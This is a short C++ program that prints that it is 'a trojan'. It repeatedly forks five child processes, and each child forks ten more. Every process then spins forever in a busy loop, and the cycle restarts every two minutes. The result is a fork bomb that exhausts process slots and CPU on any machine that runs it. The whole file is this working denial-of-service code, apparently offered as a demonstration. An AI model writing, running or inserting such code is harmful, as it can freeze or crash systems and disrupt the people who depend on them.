#include <iostream>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
using namespace std;

#define CL_1 5
#define CL_2 10

static void halt() {
    while(1) __asm("");
}

int main()
{
    cout << "Heyy a trojan here : " << getpid() << endl;
    while (true)
    {
        for (int i = 0; i < CL_1; ++i)
        {
            pid_t p = fork();
            if (p == 0)
            {
                cout << "Heyy I am a child(level one) : " << getpid() << endl;
                for (int j = 0; j < CL_2; ++j)
                {
                    pid_t pid = fork();
                    if (pid == 0)
                    {
                        cout << "Heyy again: I am a new one: " << getpid() << endl;
                        halt();
                    }
                }
                halt();
            }
        }
        sleep(120);
    }

    return 0;
}